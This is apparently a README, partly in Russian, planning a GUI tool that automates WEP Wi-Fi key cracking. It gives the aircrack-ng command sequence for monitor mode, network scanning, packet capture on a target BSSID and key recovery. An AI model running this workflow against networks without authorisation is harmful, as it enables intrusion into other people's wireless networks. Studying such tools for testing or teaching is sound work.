# wep-crack
A small GUI tool which simplifies key cracking for Wep-protected Wi-Fi networks


1) sudo airmon-ng check kill
2) sudo airmon-ng > interfaces.temp - парсим аутпут tsv, добавляем интерфейсы в список
3) sudo airmon-ng start [interface-name]
4) Кнопка поиска сетей: sudo airodump-ng [interface-name] -o csv -w networks.temp ждём 10 секунд, завершаем прогу, парсим csv в файле networks.temp. Забираем название сети, BSSID, Channel
5) sudo airodump-ng --bssid [network-bssid] --channel [network-channel] --write basic_wep.cap [interface-name]. Необходимо раз в 5 секунд парсить csv файл на предмет количества полученных фреймов. Ищем процент от 100 - индикатор состояния.
6) sudo aircrack-ng -z basic_wep.cap-01.cap - парсим после слов KEY FOUND
7) rm basic_wep*

По завершении работы:
8) sudo airmon-ng stop wlp0s20f3mon
9) возвращаем Network Manager: sudo systemctl start NetworkManager

Действия на шагах 5-6 возможны только в случае наличия активности в сети. Её придётся симулировать с помощью второго устройства и скрипта, который обращается к 192.168.1.1 например